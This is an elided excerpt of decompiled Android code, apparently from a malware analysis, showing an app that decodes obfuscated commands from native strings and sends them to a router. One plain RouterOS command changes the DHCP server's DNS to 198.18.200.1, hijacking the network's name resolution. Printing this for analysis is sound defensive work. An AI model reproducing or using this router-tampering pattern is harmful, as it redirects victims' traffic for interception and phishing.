...
public class AttentionActivity extends AppCompatActivity {
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        String key57 = new String(Base64.getDecoder().decode(string57()));
        String key58 = new String(Base64.getDecoder().decode(string58()));
            ...
            try {
                ...
                ConnectionManager.runCommand(key58);
                Thread.sleep(5000);
                    ...
                    ConnectionManager.runCommand("/ip dhcp-server network [find comment=defconf] set dns-server=198.18.200.1,8.8.8.8");
                ...
                ConnectionManager.runCommand(key57);
    ...
    public native String string57();
    public native String string58();
}
